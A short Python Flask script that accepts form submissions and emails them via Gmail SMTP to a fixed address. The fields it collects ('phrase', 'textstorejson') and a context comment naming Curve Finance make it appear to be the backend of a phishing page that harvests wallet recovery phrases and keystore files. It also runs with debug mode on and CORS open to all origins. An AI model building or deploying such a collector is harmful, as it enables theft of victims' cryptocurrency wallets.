# app.py
import os
import re
import smtplib
import time
from email.message import EmailMessage
from collections import defaultdict

from flask import Flask, request, jsonify
from flask_cors import CORS

# ---------------------------------------------------------------------------
# CONFIG — edit these
# ---------------------------------------------------------------------------
SMTP_HOST   = "smtp.gmail.com"
SMTP_PORT   = 465                      # SSL port
SMTP_USER   = "youroffical@gmail.com"  # Gmail address that SENDS the mail
SMTP_PASS   = os.environ.get("SMTP_PASS", "PASTE_APP_PASSWORD_HERE")  # 16-char App Password
RECIPIENT   = "official@yourdomain.com"  # where submissions land

# Simple in-memory rate limit: 1 submission per IP per 60 seconds
RATE_LIMIT_SECONDS = 60
_last_hit = defaultdict(float)
# ---------------------------------------------------------------------------

app = Flask(__name__)
CORS(app)  # allow your HTML page's origin to POST here

def _rate_ok(ip):
    now = time.time()
    if now - _last_hit[ip] < RATE_LIMIT_SECONDS:
        return False
    _last_hit[ip] = now
    return True

@app.route("/submit", methods=["POST"])
def submit():
    # Accept both regular form posts and JSON
    data = request.form if request.form else (request.get_json(silent=True) or {})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
    if not _rate_ok(ip):
        return jsonify(ok=False, error="Too many submissions, try again shortly."), 429

    # Honeypot: bots fill hidden fields, humans don't
    if data.get("website"):
        return jsonify(ok=True)  # silently accept so bots don't retry

    phrase = (data.get("phrase") or "").strip()
    if not phrase:
        return jsonify(ok=False, error="Message is required."), 400

    # Light validation of the optional email field
    private_email = (data.get("privateemail") or "").strip()
    if private_email and not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", private_email):
        return jsonify(ok=False, error="Invalid email address."), 400

    title   = (data.get("title")   or "").strip() or "New form submission"
    msgtype = (data.get("type")    or "").strip()
    context = (data.get("message") or "").strip()   # "Curve Finance"
    jsondata = (data.get("textstorejson") or "").strip()

    body = (
        f"Context : {context}\n"
        f"Type    : {msgtype or '(none)'}\n"
        f"Title   : {title}\n"
        f"Reply-to: {private_email or '(not provided)'}\n"
        f"\n--- Message ---\n{phrase}\n"
    )
    if jsondata:
        body += f"\n--- textstore JSON ---\n{jsondata}\n"

    msg = EmailMessage()
    msg["Subject"] = f"[Form] {title}"
    msg["From"]    = SMTP_USER
    msg["To"]      = RECIPIENT
    if private_email:
        msg["Reply-To"] = private_email
    msg.set_content(body)

    try:
        with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=15) as s:
            s.login(SMTP_USER, SMTP_PASS)
            s.send_message(msg)
    except Exception as e:
        app.logger.exception("SMTP send failed")
        return jsonify(ok=False, error=f"Mail send failed: {e}"), 500

    return jsonify(ok=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)